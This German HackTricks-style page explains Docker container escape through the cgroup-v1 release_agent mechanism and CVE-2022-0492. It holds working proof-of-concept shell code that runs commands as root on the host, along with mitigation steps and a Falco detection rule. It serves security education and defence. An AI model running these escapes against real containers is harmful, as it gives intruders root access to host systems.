# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**Für weitere Details siehe den** [**originalen Blogbeitrag**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** Dies ist nur eine Zusammenfassung:

---

## Klassische PoC (2019)
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
Die PoC missbraucht die **cgroup-v1** `release_agent` Funktion: Wenn die letzte Aufgabe eines cgroups, die `notify_on_release=1` hat, beendet wird, führt der Kernel (in den **initialen Namespaces auf dem Host**) das Programm aus, dessen Pfadname in der beschreibbaren Datei `release_agent` gespeichert ist. Da diese Ausführung mit **vollständigen Root-Rechten auf dem Host** erfolgt, reicht es aus, Schreibzugriff auf die Datei zu erhalten, um aus dem Container auszubrechen.

### Kurze, lesbare Anleitung

1. **Bereite eine neue cgroup vor**

```shell
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp   # oder –o memory
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. **Weise `release_agent` auf ein vom Angreifer kontrolliertes Skript auf dem Host zu**

```shell
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. **Lade die Payload ab**

```shell
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
chmod +x /cmd
```

4. **Trigger den Notifier**

```shell
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # füge uns hinzu und verlasse sofort
cat /output                                  # enthält jetzt Host-Prozesse
```

---

## 2022 Kernel-Sicherheitsanfälligkeit – CVE-2022-0492

Im Februar 2022 entdeckten Yiqi Sun und Kevin Wang, dass **der Kernel *keine* Berechtigungen überprüfte, wenn ein Prozess in cgroup-v1 auf `release_agent` schrieb** (Funktion `cgroup_release_agent_write`).

Effektiv **konnte jeder Prozess, der eine cgroup-Hierarchie mounten konnte (z.B. über `unshare -UrC`), einen beliebigen Pfad zu `release_agent` schreiben, ohne `CAP_SYS_ADMIN` im *initialen* Benutzernamespace**. In einem standardkonfigurierten, als Root laufenden Docker/Kubernetes-Container erlaubte dies:

* Privilegieneskalation zu Root auf dem Host; ↗
* Container-Ausbruch, ohne dass der Container privilegiert war.

Der Fehler wurde mit **CVE-2022-0492** (CVSS 7.8 / Hoch) bewertet und in den folgenden Kernel-Versionen (und allen späteren) behoben:

* 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299.

Patch-Commit: `1e85af15da28 "cgroup: Fix permission checking"`.

### Minimaler Exploit innerhalb eines Containers
```bash
# prerequisites: container is run as root, no seccomp/AppArmor profile, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
echo 1 > /tmp/c/notify_on_release;
echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Wenn der Kernel anfällig ist, wird die BusyBox-Binärdatei vom *Host* mit vollem Root-Recht ausgeführt.

### Härtung & Minderung

* **Kernel aktualisieren** (≥ Versionen darüber). Der Patch erfordert jetzt `CAP_SYS_ADMIN` im *initialen* Benutzernamespace, um auf `release_agent` zu schreiben.
* **Bevorzugen Sie cgroup-v2** – die einheitliche Hierarchie **hat die `release_agent`-Funktion vollständig entfernt**, wodurch diese Klasse von Ausbrüchen eliminiert wird.
* **Deaktivieren Sie unprivilegierte Benutzernamespaces** auf Hosts, die sie nicht benötigen:
```shell
sysctl -w kernel.unprivileged_userns_clone=0
```
* **Zwangszugriffskontrolle**: AppArmor/SELinux-Richtlinien, die `mount`, `openat` auf `/sys/fs/cgroup/**/release_agent` verweigern oder `CAP_SYS_ADMIN` entziehen, stoppen die Technik selbst auf anfälligen Kernen.
* **Schreibgeschützter Bind-Mask** für alle `release_agent`-Dateien (Palo Alto-Skriptbeispiel):
```shell
for f in $(find /sys/fs/cgroup -name release_agent); do
mount --bind -o ro /dev/null "$f"
done
```

## Erkennung zur Laufzeit

[`Falco`](https://falco.org/) liefert seit v0.32 eine integrierte Regel:
```yaml
- rule: Detect release_agent File Container Escapes
desc: Detect an attempt to exploit a container escape using release_agent
condition: open_write and container and fd.name endswith release_agent and
(user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
thread.cap_effective contains CAP_SYS_ADMIN
output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
priority: CRITICAL
tags: [container, privilege_escalation]
```
Die Regel wird bei jedem Schreibversuch auf `*/release_agent` von einem Prozess innerhalb eines Containers ausgelöst, der weiterhin `CAP_SYS_ADMIN` besitzt.

## References

* [Unit 42 – CVE-2022-0492: container escape via cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – detaillierte Analyse und Minderungsskript.
* [Sysdig Falco rule & detection guide](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

{{#include ../../../../banners/hacktricks-training.md}}
